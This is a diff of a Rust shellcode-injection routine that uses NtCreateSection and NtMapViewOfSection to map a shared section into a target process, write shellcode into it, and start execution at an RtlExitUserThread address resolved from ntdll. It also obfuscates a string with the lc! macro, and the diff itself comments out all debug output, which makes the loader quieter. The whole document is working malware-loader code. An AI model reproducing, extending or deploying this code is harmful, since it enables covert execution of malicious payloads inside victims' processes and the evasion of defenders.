@@ -126,9 +126,9 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
         *section_size.QuadPart_mut() = shell_size * mem::size_of::<u8>() as i64;
 
         //print section size
-        println!("Section Size: {}", *section_size.QuadPart());
+        //println!("Section Size: {}", *section_size.QuadPart());
         //print section handle
-        println!("Section Handle: {:?}", p_section_handle);
+        //println!("Section Handle: {:?}", p_section_handle);
 
         //call NtCreateSection
         let result: NTSTATUS = NtCreateSection(
@@ -143,26 +143,26 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
 
         //check if section_handle is null
         if section_handle == null_mut() {
-            println!("secion handle is null");
-            println!("Error Code: {}", result);
+            //println!("secion handle is null");
+            //println!("Error Code: {}", result);
             return;
         }
 
         //check if result is 0
         if result != 0 {
-            println!("Failed to create section");
-            println!("Error Code: {}", result);
+            //println!("Failed to create section");
+            //println!("Error Code: {}", result);
             return;
         }
 
         //check the result of the API call and handle any errors.
 
         if result == 0 {
-            println!("NtCreateSection successful");
-            println!("Section Handle: {:x?}", section_handle);
+            //println!("NtCreateSection successful");
+            //println!("Section Handle: {:x?}", section_handle);
         } else {
-            println!("NtCreateSection Failed!");
-            println!("Error Code: {}", result);
+            //println!("NtCreateSection Failed!");
+            //println!("Error Code: {}", result);
         }
 
         //now that we have a section handle, let's map it into the target process using NtMapViewOfSection
@@ -208,23 +208,23 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
         //make a pointer to the current process handle
         let p_current_process_handle: PHANDLE = &mut current_process_handle;
         //println!("GetLastError: {}", unsafe { GetLastError() });
-        println!("Current Process Handle: {:?}", p_current_process_handle);
+        //println!("Current Process Handle: {:?}", p_current_process_handle);
 
         //setup the maxsize equal to the size of the shell_size
         let mut maxsize: SIZE_T = shell_size as SIZE_T;
 
         let pmaxsize: PSIZE_T = &mut maxsize;
 
-        println!("maxsize: {:?}", maxsize);
-        println!("pmaxsize: {:?}", pmaxsize);
+        //println!("maxsize: {:?}", maxsize);
+        //println!("pmaxsize: {:?}", pmaxsize);
 
-        println!("section offset: {:x?}", section_offset);
-        println!("section handle: {:x?}", p_section_handle);
+        //println!("section offset: {:x?}", section_offset);
+        //println!("section handle: {:x?}", p_section_handle);
 
         //print scbase
-        println!("scbase: {:x?}", scbase);
+        //println!("scbase: {:x?}", scbase);
         //print p_scb   ase
-        println!("p_scbase: {:x?}", p_scbase);
+        //println!("p_scbase: {:x?}", p_scbase);
         //fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
         let callresult = NtMapViewOfSection(
             *p_section_handle,
@@ -241,19 +241,19 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
 
         //check if scbase is null
         if scbase == null_mut() {
-            println!("scbase is null");
-            println!("Error Code: {}", callresult);
+            //println!("scbase is null");
+            //println!("Error Code: {}", callresult);
             return;
         }
 
         //check if callresult is 0
 
         if callresult == 0 {
-            println!("NtMapViewOfSection successful");
-            println!("scbase: {:x?}", scbase);
+            //println!("NtMapViewOfSection successful");
+            //println!("scbase: {:x?}", scbase);
         } else {
-            println!("NtMapViewOfSection Failed!");
-            println!("Error Code: {}", callresult);
+            //println!("NtMapViewOfSection Failed!");
+            //println!("Error Code: {}", callresult);
             return;
         }
 
@@ -265,9 +265,9 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
         //get pointer to new_handle
         let p_new_handle: *mut HANDLE = &mut new_handle;
         //print new handle
-        println!("New Handle: {:?}", new_handle);
+        //println!("New Handle: {:?}", new_handle);
         //print p_new_handle
-        println!("p_new_handle: {:?}", p_new_handle);
+        //println!("p_new_handle: {:?}", p_new_handle);
 
         //now let's map the section into the target process using NtMapViewOfSection
         let resultmapremote = NtMapViewOfSection(
@@ -286,12 +286,12 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
         //check if scbase2 is null
 
         if scbase2 == null_mut() {
-            println!("scbase2 is null");
-            println!("Error Code: {}", resultmapremote);
+            //println!("scbase2 is null");
+            //println!("Error Code: {}", resultmapremote);
             return;
         } else {
-            println!("Remote NtMapViewOfSection successful");
-            println!("scbase2: {:x?}", scbase2);
+            //println!("Remote NtMapViewOfSection successful");
+            //println!("scbase2: {:x?}", scbase2);
         }
 
         //now write the shellcode to the shared section
@@ -353,25 +353,25 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
             true as i32,
         );
         if r != 0 {
-            println!("[!] Failed to convert function name to ANSI..");
+            //println!("[!] Failed to convert function name to ANSI..");
         }
 
         //print ntdll base address
-        println!("ntdll base address: {:x?}", ntdll_handle);
+        //println!("ntdll base address: {:x?}", ntdll_handle);
 
         let mut p_export: PVOID = std::ptr::null_mut();
         let func_name: *const c_char = a_func_name.Buffer as *const c_char;
         let call_result = ldr_get_fn(ntdll_handle, &lc!("RtlExitUserThread"));
         if call_result.is_null() {
-            println!("[!] Failed to get {} address..", export_name);
+            //println!("[!] Failed to get {} address..", export_name);
         } else {
             p_export = call_result as PVOID;
 
-            println!("    |-> {}: 0x{:X}", export_name, p_export as usize);
+            //println!("    |-> {}: 0x{:X}", export_name, p_export as usize);
         }
 
         let func_offset = (p_export as isize) - (ntdll_handle as isize);
-        println!("    |-> Offset: 0x{:X}", func_offset);
+        //println!("    |-> Offset: 0x{:X}", func_offset);
 
         //calculate the address of the remote thread start address by adding the offset to the base address of ntdll
         let remote_thread_start_address = (ntdll_handle as usize + func_offset as usize) as LPVOID;
@@ -445,7 +445,7 @@ pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
         );
 
         //check triggerresult
-        println!("triggerresult: {}", triggerresult);
+        //println!("triggerresult: {}", triggerresult);
 
         //now we can resume the thread with NtAlertResumeThread
 
